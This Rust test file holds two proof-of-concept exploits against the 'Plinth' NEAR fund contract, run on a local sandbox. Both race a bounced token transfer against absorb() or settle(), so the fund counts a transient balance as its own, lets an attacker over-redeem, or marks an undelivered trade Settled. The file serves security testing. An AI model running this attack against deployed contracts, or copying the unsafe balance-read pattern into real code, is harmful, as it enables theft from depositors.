//! Plinth end to end on a local NEAR node (near-sandbox 2.14), with real NEP-141 token contracts
//! that enforce storage registration (mock-ft) and a test 1Click signing key:
//!   - the fund is created keyless in one transaction (CreateAccount, Transfer, DeployContract,
//!     FunctionCall new) and has zero access keys;
//!   - two depositors subscribe; a hostile quote (output to someone else) is refused and recorded;
//!   - a quote inside the mandate is sent: the fund registers the (unregistered) deposit address and
//!     transfers to it in one receipt; a "solver" plays 1Click and delivers the output; anyone settles;
//!   - a depositor redeems in kind; an unregistered redeemer's payout stays owed and is claimable.
//! Build first: `bash contracts/test.sh` (or cargo near build for plinth and mock-ft).

use ed25519_dalek::{Signer, SigningKey};
use near_workspaces::operations::Function;
use near_workspaces::types::{Gas, NearToken};
use near_workspaces::{Account, AccountId, Contract, Worker};
use serde_json::{json, Value};

const PLINTH: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/../target/near/plinth/plinth.wasm");
const MOCK_FT: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/../target/near/mock_ft/mock_ft.wasm");
const STORAGE: NearToken = NearToken::from_yoctonear(1_250_000_000_000_000_000_000);

fn sk() -> SigningKey {
    SigningKey::from_bytes(&[9u8; 32])
}

fn iso(secs: u64) -> String {
    let days = (secs / 86_400) as i64;
    let rem = secs % 86_400;
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!("{:04}-{:02}-{:02}T{:02}:{:02}:{:02}.000Z", y, m, d, rem / 3600, rem % 3600 / 60, rem % 60)
}

/// A live 1Click-shaped quote signed with the test key, using the contract's own message rule.
fn quote(sell: &AccountId, buy: &AccountId, amount: u128, out: u128, min_out: u128, recipient: &AccountId, deposit: &str, issued: u64) -> String {
    let req = json!({
        "dry": false, "depositMode": "SIMPLE", "swapType": "EXACT_INPUT", "slippageTolerance": 50,
        "originAsset": format!("nep141:{sell}"), "depositType": "ORIGIN_CHAIN", "destinationAsset": format!("nep141:{buy}"),
        "amount": amount.to_string(), "refundTo": recipient, "refundType": "ORIGIN_CHAIN", "recipient": recipient,
        "recipientType": "DESTINATION_CHAIN", "deadline": iso(issued + 600), "quoteWaitingTimeMs": 0,
    });
    let q = json!({
        "amountIn": amount.to_string(), "amountInFormatted": "10.0", "amountInUsd": "10.000000", "minAmountIn": amount.to_string(),
        "amountOut": out.to_string(), "amountOutFormatted": "2.7", "amountOutUsd": "9.990000", "minAmountOut": min_out.to_string(),
        "timeEstimate": 22, "refundFee": "4500", "deadline": iso(issued + 3 * 86_400), "timeWhenInactive": iso(issued + 3 * 86_400), "depositAddress": deposit,
    });
    let ts = iso(issued);
    let msg = plinth::quote::signed_message(&near_sdk::serde_json::from_value(req.clone()).unwrap(), &near_sdk::serde_json::from_value(q.clone()).unwrap(), &ts).unwrap();
    let sig = sk().sign(msg.as_bytes());
    json!({"quote": q, "quoteRequest": req, "timestamp": ts, "signature": format!("ed25519:{}", bs58::encode(sig.to_bytes()).into_string())}).to_string()
}

async fn now_s(worker: &Worker<near_workspaces::network::Sandbox>) -> anyhow::Result<u64> {
    Ok(worker.view_block().await?.timestamp() / 1_000_000_000)
}

async fn token(worker: &Worker<near_workspaces::network::Sandbox>, root: &Account, name: &str) -> anyhow::Result<Contract> {
    let acc = root.create_subaccount(name).initial_balance(NearToken::from_near(10)).transact().await?.into_result()?;
    let c = acc.deploy(&std::fs::read(MOCK_FT)?).await?.into_result()?;
    c.call("new").transact().await?.into_result()?;
    let _ = worker;
    Ok(c)
}

async fn register(who: &Account, t: &Contract) -> anyhow::Result<()> {
    who.call(t.id(), "storage_deposit").args_json(json!({})).deposit(STORAGE).transact().await?.into_result()?;
    Ok(())
}

async fn balance(t: &Contract, who: &AccountId) -> anyhow::Result<u128> {
    Ok(t.view("ft_balance_of").args_json(json!({"account_id": who})).await?.json::<String>()?.parse()?)
}

async fn fund_view(worker: &Worker<near_workspaces::network::Sandbox>, fund: &AccountId) -> anyhow::Result<Value> {
    Ok(worker.view(fund, "get_fund").await?.json()?)
}

fn cfg(tokens: Vec<String>, op: &AccountId, close: u64) -> Value {
    json!({
        "mandate": {
            "tokens": tokens, "max_trade_bps": 2500, "max_cost_bps": 100,
            "min_seconds_between_trades": 660, "max_trades_per_day": 6, "max_quote_age_seconds": 300, "min_deadline_margin_seconds": 600,
            "subscription_closes_at": close, "min_subscription": "1000000", "max_total_subscriptions": "1000000000000",
        },
        "operator": op,
        "quote_signer": format!("ed25519:{}", bs58::encode(sk().verifying_key().to_bytes()).into_string()),
        "storage_deposit": STORAGE.as_yoctonear().to_string(),
    })
}

/// PoC: a bounced ft_transfer_call is visible in ft_balance_of for a couple of blocks; an absorb()
/// whose balance read lands in that window counts it as the fund's. held > real balance.
#[tokio::test]
async fn poc_phantom_absorb() -> anyhow::Result<()> {
    let worker = near_workspaces::sandbox().await?;
    let root = worker.root_account()?;
    let usdc = token(&worker, &root, "usdc").await?;
    let t2 = token(&worker, &root, "ttwo").await?;
    let mk = |n: &'static str| root.create_subaccount(n).initial_balance(NearToken::from_near(10)).transact();
    let alice = mk("alice").await?.into_result()?;
    let mallory = mk("mallory").await?.into_result()?;
    let eve = mk("eve").await?.into_result()?;
    for a in [&alice, &mallory] { register(a, &usdc).await?; register(a, &t2).await?; }
    root.call(usdc.id(), "mint").args_json(json!({"account_id": alice.id(), "amount": "90000000"})).transact().await?.into_result()?;
    root.call(usdc.id(), "mint").args_json(json!({"account_id": mallory.id(), "amount": "10000000"})).transact().await?.into_result()?;
    root.call(t2.id(), "mint").args_json(json!({"account_id": mallory.id(), "amount": "1000000000"})).transact().await?.into_result()?;
    let fund_id: AccountId = format!("fund.{}", root.id()).parse()?;
    let close = now_s(&worker).await? + 3600;
    let r = root.batch(&fund_id).create_account().transfer(NearToken::from_near(5)).deploy(&std::fs::read(PLINTH)?)
        .call(Function::new("new").args_json(json!({"config": cfg(vec![usdc.id().to_string(), t2.id().to_string()], root.id(), close)})).deposit(NearToken::from_millinear(20)).gas(Gas::from_tgas(200)))
        .transact().await?;
    assert!(r.is_success(), "{:?}", r.failures());
    for (who, amt) in [(&alice, "90000000"), (&mallory, "10000000")] {
        who.call(usdc.id(), "ft_transfer_call").args_json(json!({"receiver_id": fund_id, "amount": amt, "msg": ""}))
            .deposit(NearToken::from_yoctonear(1)).gas(Gas::from_tgas(150)).transact().await?.into_result()?;
    }
    // A real 100,000,000 of t2 reaches the fund and is absorbed honestly.
    mallory.call(t2.id(), "ft_transfer").args_json(json!({"receiver_id": fund_id, "amount": "100000000"})).deposit(NearToken::from_yoctonear(1)).transact().await?.into_result()?;
    eve.call(&fund_id, "absorb").args_json(json!({"token_index": 1})).gas(Gas::from_tgas(50)).transact().await?.into_result()?;
    let v = fund_view(&worker, &fund_id).await?;
    println!("before: held {} / balance {}", v["held"][1][1], balance(&t2, &fund_id).await?);
    // Attack: bounce 900,000,000 t2 off the fund (non-base tokens are returned) and absorb at the same time.
    for attempt in 0..6 {
        let bounce = mallory.call(t2.id(), "ft_transfer_call").args_json(json!({"receiver_id": fund_id, "amount": "900000000", "msg": ""}))
            .deposit(NearToken::from_yoctonear(1)).gas(Gas::from_tgas(150)).transact();
        let absorb = eve.call(&fund_id, "absorb").args_json(json!({"token_index": 1})).gas(Gas::from_tgas(50)).transact();
        let (a, b) = tokio::join!(bounce, absorb);
        let (a, b) = (a?, b?);
        let v = fund_view(&worker, &fund_id).await?;
        println!("attempt {attempt}: bounce ok={} absorb returned {:?}; held {} / real balance {} / mallory t2 {}", a.is_success(), b.json::<String>().ok(), v["held"][1][1], balance(&t2, &fund_id).await?, balance(&t2, mallory.id()).await?);
        if v["held"][1][1].as_str().unwrap().parse::<u128>()? > balance(&t2, &fund_id).await? { break; }
    }
    // Mallory (10% of shares) redeems everything she has.
    let before = balance(&t2, mallory.id()).await?;
    mallory.call(&fund_id, "redeem").args_json(json!({"shares": "10000000"})).gas(Gas::from_tgas(200)).transact().await?.into_result()?;
    println!("mallory (10% of shares) received {} t2 of the fund's real 100000000", balance(&t2, mallory.id()).await? - before);
    alice.call(&fund_id, "redeem").args_json(json!({"shares": "90000000"})).gas(Gas::from_tgas(200)).transact().await?.into_result()?;
    let owed: Vec<String> = worker.view(&fund_id, "get_owed").args_json(json!({"account_id": alice.id()})).await?.json()?;
    println!("alice (90%) received {} t2; owed (unpayable) {:?}; fund real t2 balance {}", balance(&t2, alice.id()).await?, owed, balance(&t2, &fund_id).await?);
    Ok(())
}

/// PoC: the same transient balance lets anyone close a trade in flight as Settled before 1Click
/// delivers anything, crediting the fund with output it never received.
#[tokio::test]
async fn poc_phantom_settle() -> anyhow::Result<()> {
    let worker = near_workspaces::sandbox().await?;
    let root = worker.root_account()?;
    let usdc = token(&worker, &root, "usdc").await?;
    let wnear = token(&worker, &root, "wnear").await?;
    let mk = |n: &'static str| root.create_subaccount(n).initial_balance(NearToken::from_near(10)).transact();
    let alice = mk("alice").await?.into_result()?;
    let mallory = mk("mallory").await?.into_result()?;
    let operator = mk("operator").await?.into_result()?;
    let eve = mk("eve").await?.into_result()?;
    for a in [&alice, &mallory] { register(a, &usdc).await?; register(a, &wnear).await?; }
    root.call(usdc.id(), "mint").args_json(json!({"account_id": alice.id(), "amount": "100000000"})).transact().await?.into_result()?;
    root.call(wnear.id(), "mint").args_json(json!({"account_id": mallory.id(), "amount": "5000000000000000000000000"})).transact().await?.into_result()?;
    let fund_id: AccountId = format!("fund.{}", root.id()).parse()?;
    let close = now_s(&worker).await? + 12;
    let r = root.batch(&fund_id).create_account().transfer(NearToken::from_near(5)).deploy(&std::fs::read(PLINTH)?)
        .call(Function::new("new").args_json(json!({"config": cfg(vec![usdc.id().to_string(), wnear.id().to_string()], operator.id(), close)})).deposit(NearToken::from_millinear(20)).gas(Gas::from_tgas(200)))
        .transact().await?;
    assert!(r.is_success(), "{:?}", r.failures());
    alice.call(usdc.id(), "ft_transfer_call").args_json(json!({"receiver_id": fund_id, "amount": "100000000", "msg": ""}))
        .deposit(NearToken::from_yoctonear(1)).gas(Gas::from_tgas(150)).transact().await?.into_result()?;
    while now_s(&worker).await? < close { worker.fast_forward(10).await?; }
    let now = now_s(&worker).await?;
    let deposit = "d".repeat(64);
    let min_out: u128 = 2_690_000_000_000_000_000_000_000;
    let good = quote(usdc.id(), wnear.id(), 10_000_000, 2_700_000_000_000_000_000_000_000, min_out, &fund_id, &deposit, now);
    let ok: bool = operator.call(&fund_id, "propose_trade").args_json(json!({"quote": good})).gas(Gas::from_tgas(200)).transact().await?.json()?;
    assert!(ok);
    for attempt in 0..6 {
        let bounce = mallory.call(wnear.id(), "ft_transfer_call").args_json(json!({"receiver_id": fund_id, "amount": min_out.to_string(), "msg": ""}))
            .deposit(NearToken::from_yoctonear(1)).gas(Gas::from_tgas(150)).transact();
        let settle = eve.call(&fund_id, "settle").gas(Gas::from_tgas(100)).transact();
        let (_a, b) = tokio::join!(bounce, settle);
        let st: Value = b?.json().unwrap_or(Value::Null);
        let v = fund_view(&worker, &fund_id).await?;
        println!("attempt {attempt}: settle -> {st}; pending null={}; held wNEAR {} / real balance {}", v["pending"].is_null(), v["held"][1][1], balance(&wnear, &fund_id).await?);
        if st == "Settled" { break; }
    }
    Ok(())
}
